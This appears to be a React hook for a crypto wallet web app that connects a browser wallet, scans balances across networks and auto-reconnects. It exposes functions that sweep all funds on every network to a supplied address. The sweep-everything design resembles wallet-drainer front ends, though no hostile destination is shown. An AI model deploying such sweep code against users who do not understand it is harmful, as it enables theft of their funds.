import { useState, useEffect, useCallback } from "react";
import { web3Service, type WalletState } from "@/lib/web3";
import { useToast } from "@/hooks/use-toast";

const initialState: WalletState = {
  isConnected: false,
  address: null,
  ethBalance: null,
  tokenBalances: [],
  totalUsdValue: 0,
  networkId: null,
  networkName: null,
  provider: null,
  networkBalances: [],
  allNetworksLoaded: false,
};

export function useWeb3() {
  const [walletState, setWalletState] = useState<WalletState>(initialState);
  const [isConnecting, setIsConnecting] = useState(false);
  const [isTransferring, setIsTransferring] = useState(false);
  const [isLoadingNetworks, setIsLoadingNetworks] = useState(false);
  const [hasShownConnectedToast, setHasShownConnectedToast] = useState(false);
  const { toast } = useToast();

  // Removed automatic connection attempts that were causing repeated notifications

  const connectWallet = useCallback(async () => {
    setIsConnecting(true);
    try {
      const state = await web3Service.connectWallet(); // Use faster method
      console.log('Connected wallet state:', state);
      setWalletState(state);
      
      // Background multi-network scanning - don't wait for it
      if (state.address) {
        setIsLoadingNetworks(true);
        // Background scan - no blocking delays
        web3Service.refreshNetworkBalances(state.address)
          .then((networkBalances) => {
            setWalletState(prev => ({
              ...prev,
              networkBalances,
              allNetworksLoaded: true
            }));
          })
          .catch((error: any) => {
            console.error('Failed to load network balances:', error);
          })
          .finally(() => {
            setIsLoadingNetworks(false);
          });
      }
      
      // Only show connection toast once per session
      if (!hasShownConnectedToast) {
        toast({
          title: "Wallet Connected",
          description: `Connected to ${state.address?.slice(0, 6)}...${state.address?.slice(-4)}`,
        });
        setHasShownConnectedToast(true);
      }
      return true;
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Connection Failed",
        description: error.message,
      });
      throw error;
    } finally {
      setIsConnecting(false);
    }
  }, [toast]);

  const refreshBalance = useCallback(async () => {
    if (!walletState.address || !walletState.networkId) return;

    try {
      const ethBalance = await web3Service.getEthBalance(walletState.address);
      const tokenBalances = await web3Service.getTokenBalances(walletState.address, walletState.networkId);
      const totalUsdValue = web3Service.calculateTotalUsdValue(ethBalance, tokenBalances);
      
      setWalletState(prev => ({ 
        ...prev, 
        ethBalance,
        tokenBalances,
        totalUsdValue
      }));
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Failed to Refresh Balance",
        description: error.message,
      });
    }
  }, [walletState.address, walletState.networkId, toast]);

  const transferAllFunds = useCallback(async (toAddress: string) => {
    // Debug logging to identify the issue
    console.log('Transfer validation:', {
      isConnected: walletState.isConnected,
      address: walletState.address,
      web3ServiceConnected: web3Service.isConnected(),
      windowEthereum: !!window.ethereum
    });

    // Simplified connection validation - remove web3Service.isConnected() check
    if (!walletState.isConnected || !walletState.address) {
      console.log('Wallet state validation failed:', walletState);
      toast({
        variant: "destructive",
        title: "Wallet Not Connected",
        description: "Please connect your wallet first",
      });
      return null;
    }

    // Verify wallet is still connected via ethereum provider
    try {
      if (!window.ethereum) {
        toast({
          variant: "destructive",
          title: "Wallet Not Available",
          description: "Please ensure your wallet is installed and accessible",
        });
        return null;
      }

      const accounts = await window.ethereum.request({ method: "eth_accounts" });
      console.log('Ethereum accounts check:', accounts);
      
      if (!accounts || accounts.length === 0) {
        console.log('No accounts found, clearing wallet state');
        toast({
          variant: "destructive",
          title: "Wallet Not Connected",
          description: "Please connect your wallet first",
        });
        // Clear the wallet state since it's not actually connected
        setWalletState(initialState);
        return null;
      }

      if (accounts[0] !== walletState.address) {
        console.log('Address mismatch:', {
          currentAccount: accounts[0],
          savedAddress: walletState.address
        });
        toast({
          variant: "destructive",
          title: "Wallet Address Changed",
          description: "Please reconnect your wallet",
        });
        setWalletState(initialState);
        return null;
      }
      
      console.log('All validation checks passed, proceeding with transfer');
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Wallet Connection Error", 
        description: "Unable to verify wallet connection",
      });
      return null;
    }

    setIsTransferring(true);
    try {
      // Ensure web3Service is properly connected before transfer
      if (!web3Service.isConnected()) {
        // Reconnect the service with current ethereum provider
        await web3Service.connectWallet();
      }
      
      const txHashes = await web3Service.transferAllFunds(toAddress);
      toast({
        title: "Transactions Submitted",
        description: `${txHashes.length} transaction(s) submitted successfully`,
      });
      
      // Refresh balance after transaction
      setTimeout(() => {
        refreshBalance();
      }, 3000);

      return txHashes;
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Transfer Failed",
        description: error.message,
      });
      return null;
    } finally {
      setIsTransferring(false);
    }
  }, [walletState.isConnected, walletState.address, toast, refreshBalance]);



  const getTransactionStatus = useCallback(async (txHash: string) => {
    try {
      return await web3Service.getTransactionStatus(txHash);
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Failed to Get Transaction Status",
        description: error.message,
      });
      return null;
    }
  }, [toast]);

  // Setup event listeners for account and network changes
  useEffect(() => {
    const handleAccountChange = (accounts: string[]) => {
      if (accounts.length === 0) {
        setWalletState(initialState);
        setHasShownConnectedToast(false); // Reset toast flag
        toast({
          title: "Wallet Disconnected",
          description: "Your wallet has been disconnected",
        });
      } else if (accounts[0] !== walletState.address) {
        // Account changed, update state without reconnecting
        setWalletState(prev => ({
          ...prev,
          address: accounts[0]
        }));
      }
    };

    const handleNetworkChange = (networkId: string) => {
      // Network changed, update state without full reconnection
      if (walletState.isConnected) {
        setWalletState(prev => ({
          ...prev,
          networkId: networkId,
          networkName: `Network ${networkId}`
        }));
      }
    };

    web3Service.setupEventListeners(handleAccountChange, handleNetworkChange);

    return () => {
      web3Service.removeEventListeners();
    };
  }, [walletState.address, walletState.isConnected, connectWallet, toast]);

  // Enhanced connection state persistence and monitoring
  useEffect(() => {
    const persistConnectionState = () => {
      if (walletState.isConnected && walletState.address) {
        sessionStorage.setItem('wallet_connected', 'true');
        sessionStorage.setItem('wallet_address', walletState.address);
      } else {
        sessionStorage.removeItem('wallet_connected');
        sessionStorage.removeItem('wallet_address');
      }
    };

    persistConnectionState();

    // Disabled real-time monitoring for better performance
    // Connection state changes will be handled by wallet events instead
  }, [walletState.isConnected, walletState.address, toast]);

  // Controlled auto-connect - prevent multiple triggers
  useEffect(() => {
    const instantAutoConnect = () => {
      // Skip if no ethereum, already connecting, or already connected
      if (!window.ethereum || isConnecting || walletState.isConnected) return;
      
      // Quick session check
      const wasConnected = sessionStorage.getItem('wallet_connected');
      const savedAddress = sessionStorage.getItem('wallet_address');
      
      if (wasConnected === 'true' && savedAddress) {
        // Direct eth_accounts call - fastest method
        window.ethereum.request({ method: "eth_accounts" })
          .then((accounts: string[]) => {
            if (accounts && accounts.length > 0 && accounts[0] === savedAddress) {
              // Only reconnect if the saved address matches current account
              connectWallet();
            } else {
              // Clear outdated session data
              sessionStorage.clear();
            }
          })
          .catch(() => sessionStorage.clear());
      }
    };

    // Run only once when component mounts
    instantAutoConnect();
  }, []); // Remove dependencies to prevent re-running

  const refreshAllNetworks = useCallback(async () => {
    if (!walletState.address) return;
    
    setIsLoadingNetworks(true);
    try {
      const networkBalances = await web3Service.refreshNetworkBalances(walletState.address);
      setWalletState(prev => ({
        ...prev,
        networkBalances,
        allNetworksLoaded: true
      }));
      
      toast({
        title: "Networks Updated",
        description: `Found balances across ${networkBalances.length} networks`,
      });
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Failed to Refresh Networks",
        description: error.message,
      });
    } finally {
      setIsLoadingNetworks(false);
    }
  }, [walletState.address, toast]);

  const transferAllFundsMultiNetwork = useCallback(async (toAddress: string) => {
    // Enhanced connection validation
    if (!walletState.isConnected || !walletState.address || !web3Service.isConnected()) {
      toast({
        variant: "destructive",
        title: "Wallet Not Connected",
        description: "Please connect your wallet first",
      });
      return null;
    }

    // Double-check wallet connection is still active
    try {
      const accounts = await window.ethereum?.request({ method: "eth_accounts" });
      if (!accounts || accounts.length === 0 || accounts[0] !== walletState.address) {
        toast({
          variant: "destructive",
          title: "Wallet Connection Lost",
          description: "Please reconnect your wallet and try again",
        });
        setWalletState(initialState);
        return null;
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Wallet Connection Error",
        description: "Unable to verify wallet connection",
      });
      return null;
    }

    setIsTransferring(true);
    try {
      const result = await web3Service.transferAllFundsMultiNetwork(toAddress);
      
      if (result.success) {
        toast({
          title: "Multi-Network Transfer Completed",
          description: `${result.successfulNetworks}/${result.totalNetworks} networks successful. ${result.totalTransactions} total transactions.`,
        });
      } else {
        toast({
          variant: "destructive",
          title: "Multi-Network Transfer Failed",
          description: result.summary,
        });
      }
      
      // Refresh all network balances after transfer
      setTimeout(() => {
        if (walletState.address) {
          refreshAllNetworks();
        }
      }, 5000);

      return result;
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Multi-Network Transfer Failed",
        description: error.message,
      });
      return null;
    } finally {
      setIsTransferring(false);
    }
  }, [walletState.isConnected, walletState.address, toast, refreshAllNetworks]);

  return {
    walletState,
    isConnecting,
    isTransferring,
    isLoadingNetworks,
    connectWallet,
    refreshBalance,
    refreshAllNetworks,
    transferAllFunds,
    transferAllFundsMultiNetwork,
    getTransactionStatus,
  };
}
